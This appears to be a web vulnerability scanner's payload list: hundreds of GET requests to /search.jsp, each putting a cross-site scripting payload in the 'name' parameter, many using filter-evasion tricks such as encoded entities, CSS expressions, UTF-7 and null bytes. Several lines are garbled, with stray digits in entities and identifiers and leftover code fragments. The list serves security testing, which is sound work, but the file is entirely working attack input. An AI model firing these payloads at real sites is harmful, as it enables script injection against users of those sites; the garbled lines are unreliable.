+/search.jsp?name=<img src=x\x3493onerror="javascript:alert(349)">
+/search.jsp?name=<img[a][b][c]src[d]=x[e]onerror=[f]"alert(350)">
+/search.jsp?name=<img src=x onerror=\x09"javascript:alert(351)">
+/search.jsp?name=<img src=x onerror=\x3520"javascript:alert(352)">
+/search.jsp?name=<img src=x onerror=\x353353"javascript:alert(353)">
+/search.jsp?name=<img src=x onerror=\x3542"javascript:alert(354)">
+/search.jsp?name=<img src=x onerror=\x32"javascript:alert(355)">
+/search.jsp?name=<img src=x onerror=\x00"javascript:alert(356)">
+/search.jsp?name=<a href=java&#357&#2&#3&#4&#5&#6&#7&#8&#357357&#3572script:javascript:alert(357)>XXX</a>
+/search.jsp?name=<img src="x` `<script>javascript:alert(358)</script>"` `>
+/search.jsp?name=<img src onerror /" '"= alt=javascript:alert(359)//">
+/search.jsp?name=<title onpropertychange=javascript:alert(360)></title><title title=>
+/search.jsp?name=<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(361)></a>">
+/search.jsp?name=<!--[if]><script>javascript:alert(362)</script -->
+/search.jsp?name=<!--[if<img src=x onerror=javascript:alert(363)//]> -->
+/search.jsp?name=<object id="x" classid="clsid:CB927D3662-4FF7-4a9e-A36669-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C3667-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(366)" style="behavior:url(#x);"><param name=postdomevents /></object>
+/search.jsp?name=<a style="-o-link:'javascript:javascript:alert(367)';-o-link-source:current">X
+/search.jsp?name=<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(368)'}{}*{-o-link-source:current}]{color:red};</style>
+/search.jsp?name=<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(369))%7d
+/search.jsp?name=<style>@import "data:,*%7bx:expression(javascript:alert(370))%7D";</style>
+/search.jsp?name=<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(371);">XXX</a></a><a href="javascript:javascript:alert(371)">XXX</a>
+/search.jsp?name=<// style=x:expression\28javascript:alert(375)\29>
+/search.jsp?name=<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(376))}</style>
+/search.jsp?name=<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(378));">X
+/search.jsp?name=<script>({set/**/$($){_/**/setter=$,_=javascript:alert(384)}}).$=eval</script>
+/search.jsp?name=<script>({0:#0=eval/#0#/#0#(javascript:alert(385))})</script>
+/search.jsp?name=<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(386)}),x</script>
+/search.jsp?name=<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(387)')()</script>
+/search.jsp?name=<meta charset="mac-farsi">¼script¾javascript:alert(390)¼/script¾
+/search.jsp?name=X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(391)` >
+/search.jsp?name=392<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x4392vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(392)&gt;`>
+/search.jsp?name=393<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(393)&gt;>
+/search.jsp?name=395<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(395) strokecolor=white strokeweight=395000px from=0 to=395000 /></a>
+/search.jsp?name=<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(396)">XXX</a>
+/search.jsp?name=<event-source src="%(event)s" onload="javascript:alert(399)">
+/search.jsp?name=<a href="javascript:javascript:alert(400)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+/search.jsp?name=<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#401401;src=x:x&#401401;onerror&#401401;=javascript:alert(401)&gt;">
+/search.jsp?name=<script>javascript:alert(405)</script>
+/search.jsp?name=<IMG SRC="javascript:javascript:alert(406);">
+/search.jsp?name=<IMG SRC=javascript:javascript:alert(407)>
+/search.jsp?name=<IMG SRC=`javascript:javascript:alert(408)`>
+/search.jsp?name=<FRAMESET><FRAME SRC="javascript:javascript:alert(410);"></FRAMESET>
+/search.jsp?name=<BODY ONLOAD=javascript:alert(411)>
+/search.jsp?name=<BODY ONLOAD=javascript:javascript:alert(412)>
+/search.jsp?name=<IMG SRC="jav    ascript:javascript:alert(413);">
+/search.jsp?name=<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(414)>
+/search.jsp?name=<IMG SRC="javascript:javascript:alert(417)"
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(419);">
+/search.jsp?name=<IMG DYNSRC="javascript:javascript:alert(420)">
+/search.jsp?name=<IMG LOWSRC="javascript:javascript:alert(421)">
+/search.jsp?name=<BGSOUND SRC="javascript:javascript:alert(422);">
+/search.jsp?name=<BR SIZE="&{javascript:alert(423)}">
+/search.jsp?name=<LINK REL="stylesheet" HREF="javascript:javascript:alert(425);">
+/search.jsp?name=<STYLE>li {list-style-image: url("javascript:javascript:alert(429)");}</STYLE><UL><LI>XSS
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(430);">
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(431);">
+/search.jsp?name=<IFRAME SRC="javascript:javascript:alert(432);"></IFRAME>
+/search.jsp?name=<TABLE BACKGROUND="javascript:javascript:alert(433)">
+/search.jsp?name=<TABLE><TD BACKGROUND="javascript:javascript:alert(434)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:javascript:alert(435))">
+/search.jsp?name=<DIV STYLE="width:expression(javascript:alert(436));">
+/search.jsp?name=<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(437))">
+/search.jsp?name=<XSS STYLE="xss:expression(javascript:alert(438))">
+/search.jsp?name=<STYLE TYPE="text/javascript">javascript:alert(439);</STYLE>
+/search.jsp?name=<STYLE>.XSS{background-image:url("javascript:javascript:alert(440)");}</STYLE><A CLASS=XSS></A>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(441)")}</STYLE>
+/search.jsp?name=<!--[if gte IE 4]><SCRIPT>javascript:alert(442);</SCRIPT><![endif]-->
+/search.jsp?name=<BASE HREF="javascript:javascript:alert(443);//">
+/search.jsp?name=<OBJECT classid=clsid:ae24fdae-03c6-445445d445-8b76-0080c744f389><param name=url value=javascript:javascript:alert(445)></OBJECT>
+/search.jsp?name=<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(446)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+/search.jsp?name=<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(447)&lt;/SCRIPT&gt;"></BODY></HTML>
+/search.jsp?name=<form id="test" /><button form="test" formaction="javascript:javascript:alert(450)">X
+/search.jsp?name=<body onscroll=javascript:alert(451)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+/search.jsp?name=<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(452)">
+/search.jsp?name=<STYLE>a{background:url('s454' 's2)}@import javascript:javascript:alert(454);');}</STYLE>
+/search.jsp?name=<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(455)&&;&&<&&/script&&>
+/search.jsp?name=<SCRIPT onreadystatechange=javascript:javascript:alert(456);></SCRIPT>
+/search.jsp?name=<style onreadystatechange=javascript:javascript:alert(457);></style>
+/search.jsp?name=<?xml version="458.0"?><html:html xmlns:html='http://www.w3.org/458999/xhtml'><html:script>javascript:alert(458);</html:script></html:html>
+/search.jsp?name=<embed code=javascript:javascript:alert(460);></embed>
+/search.jsp?name=<frameset onload=javascript:javascript:alert(462)></frameset>
+/search.jsp?name=<object onerror=javascript:javascript:alert(463)>
+/search.jsp?name=<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(465);">]]</C><X></xml>
+/search.jsp?name=<IMG SRC=&{javascript:alert(466);};>
+/search.jsp?name=<a href="jav&#65ascript:javascript:alert(467)">test467</a>
+/search.jsp?name=<a href="jav&#97ascript:javascript:alert(468)">test468</a>
+/search.jsp?name=<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(470)&amp;gt;>">
+/search.jsp?name=';alert(471))//';alert(471))//";
+/search.jsp?name=alert(472))//";alert(472))//--
+/search.jsp?name=></SCRIPT>">'><SCRIPT>alert(473))</SCRIPT>
+/search.jsp?name=<IMG SRC="javascript:alert(476);">
+/search.jsp?name=<IMG SRC=javascript:alert(477)>
+/search.jsp?name=<IMG SRC=JaVaScRiPt:alert(478)>
+/search.jsp?name=<IMG SRC=javascript:alert(479)>
+/search.jsp?name=<IMG SRC=`javascript:alert(480)`>
+/search.jsp?name=<a onmouseover="alert(481)">xxs link</a>
+/search.jsp?name=<a onmouseover=alert(482)>xxs link</a>
+/search.jsp?name=<IMG """><SCRIPT>alert(483)</SCRIPT>">
+/search.jsp?name=<IMG SRC=javascript:alert(484))>
+/search.jsp?name=<IMG SRC=# onmouseover="alert(485)">
+/search.jsp?name=<IMG SRC= onmouseover="alert(486)">
+/search.jsp?name=<IMG onmouseover="alert(487)">
+/search.jsp?name=<IMG SRC="jav	ascript:alert(491);">
+/search.jsp?name=<IMG SRC="jav&#x09;ascript:alert(492);">
+/search.jsp?name=<IMG SRC="jav&#x0A;ascript:alert(493);">
+/search.jsp?name=<IMG SRC="jav&#x0D;ascript:alert(494);">
+/search.jsp?name=perl -e 'print "<IMG SRC=java\0script:alert(495)>";' > out
+/search.jsp?name=<IMG SRC=" &#14;  javascript:alert(496);">
+/search.jsp?name=<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(498)>
+/search.jsp?name=<<SCRIPT>alert(500);//<</SCRIPT>
+/search.jsp?name=<IMG SRC="javascript:alert(503)"
+/search.jsp?name=\";alert(505);//
+/search.jsp?name=</TITLE><SCRIPT>alert(506);</SCRIPT>
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:alert(507);">
+/search.jsp?name=<BODY BACKGROUND="javascript:alert(508)">
+/search.jsp?name=<IMG DYNSRC="javascript:alert(509)">
+/search.jsp?name=<IMG LOWSRC="javascript:alert(510)">
+/search.jsp?name=<STYLE>li {list-style-image: url("javascript:alert(511)");}</STYLE><UL><LI>XSS</br>
+/search.jsp?name=<BODY ONLOAD=alert(514)>
+/search.jsp?name=<BGSOUND SRC="javascript:alert(515);">
+/search.jsp?name=<BR SIZE="&{alert(516)}">
+/search.jsp?name=<LINK REL="stylesheet" HREF="javascript:alert(517);">
+/search.jsp?name=<STYLE>@im\port'\ja\vasc\ript:alert(522)';</STYLE>
+/search.jsp?name=<IMG STYLE="xss:expr/*XSS*/ession(alert(523))">
+/search.jsp?name=exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert(524))'>
+/search.jsp?name=<STYLE TYPE="text/javascript">alert(525);</STYLE>
+/search.jsp?name=<STYLE>.XSS{background-image:url("javascript:alert(526)");}</STYLE><A CLASS=XSS></A>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:alert(527)")}</STYLE>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:alert(528)")}</STYLE>
+/search.jsp?name=<XSS STYLE="xss:expression(alert(529))">
+/search.jsp?name=¼script¾alert(531)¼/script¾
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(532);">
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(534);">
+/search.jsp?name=<IFRAME SRC="javascript:alert(535);"></IFRAME>
+/search.jsp?name=<IFRAME SRC=# onmouseover="alert(536)"></IFRAME>
+/search.jsp?name=<FRAMESET><FRAME SRC="javascript:alert(537);"></FRAMESET>
+/search.jsp?name=<TABLE BACKGROUND="javascript:alert(538)">
+/search.jsp?name=<TABLE><TD BACKGROUND="javascript:alert(539)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:alert(540))">
+/search.jsp?name=<DIV STYLE="background-image: url(&#1;javascript:alert(542))">
+/search.jsp?name=<DIV STYLE="width: expression(alert(543));">
+/search.jsp?name=<BASE HREF="javascript:alert(544);//">
+/search.jsp?name=<? echo('<SCR)';echo('IPT>alert(549)</SCRIPT>'); ?>
+/search.jsp?name=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(552)</SCRIPT>">
+/search.jsp?name= <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(553);+ADw-/SCRIPT+AD4-
+/search.jsp?name=<img src=`%00`&NewLine; onerror=alert(573)&NewLine;
+/search.jsp?name=<script /*%00*/>/*%00*/alert(577)/*%00*/</script /*%00*/
+/search.jsp?name=<iframe/src="data:text/html,<svg &#579579579;&#5795790;load=alert(579)>">
+/search.jsp?name=<meta content="&NewLine; 580 &NewLine;; JAVASCRIPT&colon; alert(580)" http-equiv="refresh"/>
+/search.jsp?name=<form><iframe &#09;&#5880;&#588588; src="javascript&#58;alert(588)"&#588588;&#5880;&#09;;>
+/search.jsp?name=http://www.google<script .com>alert(590)</script
+/search.jsp?name=<script ^__^>alert(594))</script ^__^
+/search.jsp?name=</style &#32;><script &#32; :-(>/**/alert(595)/**/</script &#32; :-(
+/search.jsp?name=&#00;</form><input type&#6596;"date" onfocus="alert(596)">
+/search.jsp?name=<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(600)&NewLine;>X</a>
+/search.jsp?name=<script ~~~>alert(601)</script ~~~>
+/search.jsp?name=<iframe/%00/ src=javaSCRIPT&colon;alert(609)
+/search.jsp?name=<%<!--'%><script>alert(626);</script -->
+/search.jsp?name=<script src="data:text/javascript,alert(627)"></script>
+/search.jsp?name=<iframe/onreadystatechange=alert(629)
+/search.jsp?name=<svg/onload=alert(630)
+/search.jsp?name=<input type="text" value=`` <div/onmouseover='alert(632)'>X</div>
+/search.jsp?name=http://www.<script>alert(633)</script .com
+/search.jsp?name=<svg><script ?>alert(635)
+/search.jsp?name=<img src=`xx:xx`onerror=alert(637)>
+/search.jsp?name=<meta http-equiv="refresh" content="0;javascript&colon;alert(639)"/>
+/search.jsp?name=<script>+-+-649-+-+alert(649)</script>
+/search.jsp?name=<body/onload=&lt;!--&gt;&#6500alert(650)>
+/search.jsp?name=<script itworksinallbrowsers>/*<script* */alert(651)</script
+/search.jsp?name=<img src ?itworksonchrome?\/onerror = alert(652)
+/search.jsp?name=<svg><script onlypossibleinopera:-)> alert(654)
+/search.jsp?name=<script x> alert(656) </script 656=2
+/search.jsp?name=<div/onmouseover='alert(657)'> style="x:">
+/search.jsp?name=<--`<img/src=` onerror=alert(658)> --!>
+/search.jsp?name=<div style="position:absolute;top:0;left:0;width:66000%;height:66000%" onmouseover="prompt(660)" onclick="alert(660)">x</button>
+/search.jsp?name=<form><button formaction=javascript&colon;alert(662)>CLICKME
+/search.jsp?name=‘; alert(667);
+/search.jsp?name=‘)alert(668);//
+/search.jsp?name=<ScRiPt>alert(669)</sCriPt>
+/search.jsp?name=<IMG SRC=jAVasCrIPt:alert(670)>
+/search.jsp?name=<IMG SRC=”javascript:alert(671);”>
+/search.jsp?name=<IMG SRC=javascript:alert(672)>
+/search.jsp?name=<IMG SRC=javascript:alert(673)>
+/search.jsp?name=<img src=xss onerror=alert(674)>
+/search.jsp?name=<img src=`%00`&NewLine; onerror=alert(681)&NewLine;
+/search.jsp?name=<script /*%00*/>/*%00*/alert(685)/*%00*/</script /*%00*/
+/search.jsp?name=<iframe/src="data:text/html,<svg &#687687687;&#6876870;load=alert(687)>">
+/search.jsp?name=<meta content="&NewLine; 688 &NewLine;; JAVASCRIPT&colon; alert(688)" http-equiv="refresh"/>
+/search.jsp?name=<form><iframe &#09;&#6960;&#696696; src="javascript&#58;alert(696)"&#696696;&#6960;&#09;;>
+/search.jsp?name=http://www.google<script .com>alert(698)</script
+/search.jsp?name=<script ^__^>alert(702))</script ^__^
+/search.jsp?name=</style &#32;><script &#32; :-(>/**/alert(703)/**/</script &#32; :-(
+/search.jsp?name=&#00;</form><input type&#6704;"date" onfocus="alert(704)">
+/search.jsp?name=<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(708)&NewLine;>X</a>
+/search.jsp?name=<script ~~~>alert(709)</script ~~~>
+/search.jsp?name=<iframe/%00/ src=javaSCRIPT&colon;alert(717)
+/search.jsp?name=<%<!--'%><script>alert(734);</script -->
+/search.jsp?name=<script src="data:text/javascript,alert(735)"></script>
+/search.jsp?name=<iframe/onreadystatechange=alert(737)
+/search.jsp?name=<svg/onload=alert(738)
+/search.jsp?name=<input type="text" value=`` <div/onmouseover='alert(740)'>X</div>
+/search.jsp?name=http://www.<script>alert(741)</script .com
+/search.jsp?name=<svg><script ?>alert(743)
+/search.jsp?name=<img src=`xx:xx`onerror=alert(745)>
+/search.jsp?name=<meta http-equiv="refresh" content="0;javascript&colon;alert(746)"/>
+/search.jsp?name=<script>+-+-756-+-+alert(756)</script>
+/search.jsp?name=<body/onload=&lt;!--&gt;&#7570alert(757)>
+/search.jsp?name=<script itworksinallbrowsers>/*<script* */alert(758)</script
+/search.jsp?name=<img src ?itworksonchrome?\/onerror = alert(759)
+/search.jsp?name=<svg><script onlypossibleinopera:-)> alert(761)
+/search.jsp?name=<script x> alert(763) </script 763=2
+/search.jsp?name=<div/onmouseover='alert(764)'> style="x:">
+/search.jsp?name=<--`<img/src=` onerror=alert(765)> --!>
+/search.jsp?name=<div style="xg-p:absolute;top:0;left:0;width:76700%;height:76700%" onmouseover="prompt(767)" onclick="alert(767)">x</button>
+/search.jsp?name=<form><button formaction=javascript&colon;alert(769)>CLICKME
+/search.jsp?name=‘;alert(775))//’;alert(775))//”;alert(775))//”;alert(775))//–></SCRIPT>”>’><SCRIPT>alert(775))</SCRIPT>
+/search.jsp?name=<IMG “””><SCRIPT>alert(776)</SCRIPT>”>
+/search.jsp?name=<IMG SRC=javascript:alert(777))>
+/search.jsp?name=<IMG SRC=”jav ascript:alert(778);”>
+/search.jsp?name=<IMG SRC=”jav&#x09;ascript:alert(779);”>
+/search.jsp?name=<<SCRIPT>alert(780);//<</SCRIPT>
+/search.jsp?name=%253cscript%253ealert(781)%253c/script%253e
+/search.jsp?name=“><s”%2b”cript>alert(782)</script>
+/search.jsp?name=foo<script>alert(783)</script>
+/search.jsp?name=<scr<script>ipt>alert(784)</scr</script>ipt>
+/search.jsp?name=<BODY BACKGROUND=”javascript:alert(788)”>
+/search.jsp?name=<BODY ONLOAD=alert(789)>
+/search.jsp?name=<INPUT TYPE=”IMAGE” SRC=”javascript:alert(790);”>
+/search.jsp?name=<IMG SRC=”javascript:alert(791)”
+/search.jsp?name=javascript:alert(793)
+/search.jsp?name=<img src="javascript:alert(794);">
+/search.jsp?name=<img src=javascript:alert(795)>
+/search.jsp?name=<"';alert(796))//\';alert(796))//";alert(796))//\";alert(796))//--></SCRIPT>">'><SCRIPT>alert(796))</SCRIPT>
+/search.jsp?name=<IFRAME SRC="javascript:alert(798);"></IFRAME>
+/search.jsp?name=<<SCRIPT>alert(805);//<</SCRIPT>
+/search.jsp?name=<"';alert(806))//\';alert(806))//";alert(806))//\";alert(806))//--></SCRIPT>">'><SCRIPT>alert(806))</SCRIPT>
+/search.jsp?name=';alert(807))//\';alert(807))//";alert(807))//\";alert(807))//--></SCRIPT>">'><SCRIPT>alert(807))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+/search.jsp?name=<script>alert(808)</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+/search.jsp?name=<script>alert(809);</script>&search=1
+/search.jsp?name=0&q=';alert(810))//\';alert%2?8810))//";alert(String.fromCharCode?(88,83,83))//\";alert(810)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+/search.jsp?name=<BODY ONLOAD=alert(812)>
+/search.jsp?name=<body onscroll=alert(815)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+/search.jsp?name=<form><button formaction="javascript:alert(816)">lol
+/search.jsp?name=<!--<img src="--><img src=x onerror=alert(817)//">
+/search.jsp?name=<![><img src="]><img src=x onerror=alert(818)//">
+/search.jsp?name=<style><img src="</style><img src=x onerror=alert(819)//">
+/search.jsp?name=<? foo="><script>alert(820)</script>">
+/search.jsp?name=<! foo="><script>alert(821)</script>">
+/search.jsp?name=</ foo="><script>alert(822)</script>">
+/search.jsp?name=<? foo="><x foo='?><script>alert(823)</script>'>">
+/search.jsp?name=<! foo="[[[Inception]]"><x foo="]foo><script>alert(824)</script>">
+/search.jsp?name=<% foo><x foo="%><script>alert(825)</script>">
+/search.jsp?name=<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(829)</script></svg>
+/search.jsp?name=&lt;SCRIPT&gt;alert(830)&lt;/SCRIPT&gt;
+/search.jsp?name=\\";alert(831);//
+/search.jsp?name=&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(832);&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert(833);\"&gt;
+/search.jsp?name=&lt;BODY BACKGROUND=\"javascript&#058;alert(834)\"&gt;
+/search.jsp?name=&lt;BODY ONLOAD=alert(835)&gt;
+/search.jsp?name=&lt;IMG DYNSRC=\"javascript&#058;alert(836)\"&gt;
+/search.jsp?name=&lt;IMG LOWSRC=\"javascript&#058;alert(837)\"&gt;
+/search.jsp?name=&lt;BGSOUND SRC=\"javascript&#058;alert(838);\"&gt;
+/search.jsp?name=&lt;BR SIZE=\"&{alert(839)}\"&gt;
+/search.jsp?name=&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert(841);\"&gt;
+/search.jsp?name=&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert(847)\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+/search.jsp?name=žscriptualert(851)ž/scriptu
+/search.jsp?name=&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert(852);\"&gt;
+/search.jsp?name=&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert(854);\"
+/search.jsp?name=&lt;IFRAME SRC=\"javascript&#058;alert(855);\"&gt;&lt;/IFRAME&gt;
+/search.jsp?name=&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert(856);\"&gt;&lt;/FRAMESET&gt;
+/search.jsp?name=&lt;TABLE BACKGROUND=\"javascript&#058;alert(857)\"&gt;
+/search.jsp?name=&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert(858)\"&gt;
+/search.jsp?name=&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert(859))\"&gt;
+/search.jsp?name=&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert(861))\"&gt;
+/search.jsp?name=&lt;DIV STYLE=\"width&#58; expression(alert(862));\"&gt;
+/search.jsp?name=&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(863)';&lt;/STYLE&gt;
+/search.jsp?name=&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert(864))\"&gt;
+/search.jsp?name=&lt;XSS STYLE=\"xss&#58;expression(alert(865))\"&gt;
+/search.jsp?name=xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(867))'&gt;
+/search.jsp?name=&lt;STYLE TYPE=\"text/javascript\"&gt;alert(868);&lt;/STYLE&gt;
+/search.jsp?name=&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert(869)\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+/search.jsp?name=&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert(870)\")}&lt;/STYLE&gt;
+/search.jsp?name=&lt;SCRIPT&gt;alert(872);&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;BASE HREF=\"javascript&#058;alert(874);//\"&gt;
+/search.jsp?name=&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert(876)&gt;&lt;/OBJECT&gt;
+/search.jsp?name=d=\"alert(882);\\")\";
+/search.jsp?name=&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert(885);\"&gt;&#93;&#93;&gt;
+/search.jsp?name=&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert(887)\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+/search.jsp?name=&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(894)&lt;/SCRIPT&gt;\"&gt;
+/search.jsp?name=echo('IPT&gt;alert(899)&lt;/SCRIPT&gt;'); ?&gt;
+/search.jsp?name=&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert(902)&lt;/SCRIPT&gt;\"&gt;
+/search.jsp?name=&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(903);+ADw-/SCRIPT+AD4-
+/search.jsp?name=&lt;IMG SRC=\"javascript&#058;alert(991)\"
+/search.jsp?name=&lt;&lt;SCRIPT&gt;alert(994);//&lt;&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(996)&gt;
+/search.jsp?name=&lt;IMG SRC=\"   javascript&#058;alert(998);\"&gt;
+/search.jsp?name=perl -e 'print \"&lt;SCR\0IPT&gt;alert(999)&lt;/SCR\0IPT&gt;\";' &gt; out
+/search.jsp?name=perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(1000)&gt;\";' &gt; out
+/search.jsp?name=&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert(1001);\"&gt;
+/search.jsp?name=&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert(1002);\"&gt;
+/search.jsp?name=&lt;IMG SRC=\"jav&#x09;ascript&#058;alert(1003);\"&gt;
+/search.jsp?name=&lt;IMG SRC=javascript&#058;alert(1006)&gt;
+/search.jsp?name=&lt;IMG SRC=javascript&#058;alert(1007))&gt;
+/search.jsp?name=&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(1008)&lt;/SCRIPT&gt;\"&gt;
+/search.jsp?name=&lt;IMG SRC=`javascript&#058;alert(1009)`&gt;
+/search.jsp?name=&lt;IMG SRC=javascript&#058;alert(1010)&gt;
+/search.jsp?name=&lt;IMG SRC=JaVaScRiPt&#058;alert(1011)&gt;
+/search.jsp?name=&lt;IMG SRC=javascript&#058;alert(1012)&gt;
+/search.jsp?name=&lt;IMG SRC=\"javascript&#058;alert(1013);\"&gt;
+/search.jsp?name=';alert(1016))//\';alert(1016))//\";alert(1016))//\\";alert(1016))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(1016))&lt;/SCRIPT&gt;
+/search.jsp?name=';alert(1017))//\';alert(1017))//";alert(1017))//\";alert(1017))//--></SCRIPT>">'><SCRIPT>alert(1017))</SCRIPT>
+/search.jsp?name=<IMG SRC="javascript:alert(1020);">
+/search.jsp?name=<IMG SRC=javascript:alert(1021)>
+/search.jsp?name=<IMG SRC=javascrscriptipt:alert(1022)>
+/search.jsp?name=<IMG SRC=JaVaScRiPt:alert(1023)>
+/search.jsp?name=<IMG """><SCRIPT>alert(1024)</SCRIPT>">
+/search.jsp?name=<IMG SRC=" &#14;  javascript:alert(1025);">
+/search.jsp?name=<<SCRIPT>alert(1028);//<</SCRIPT>
+/search.jsp?name=<SCRIPT>a=/XSS/alert(1029)</SCRIPT>
+/search.jsp?name=\";alert(1030);//
+/search.jsp?name=</TITLE><SCRIPT>alert(1031);</SCRIPT>
+/search.jsp?name=¼script¾alert(1032)¼/script¾
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1033);">
+/search.jsp?name=<IFRAME SRC="javascript:alert(1034);"></IFRAME>
+/search.jsp?name=<FRAMESET><FRAME SRC="javascript:alert(1035);"></FRAMESET>
+/search.jsp?name=<TABLE BACKGROUND="javascript:alert(1036)">
+/search.jsp?name=<TABLE><TD BACKGROUND="javascript:alert(1037)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:alert(1038))">
+/search.jsp?name=<DIV STYLE="width: expression(alert(1040));">
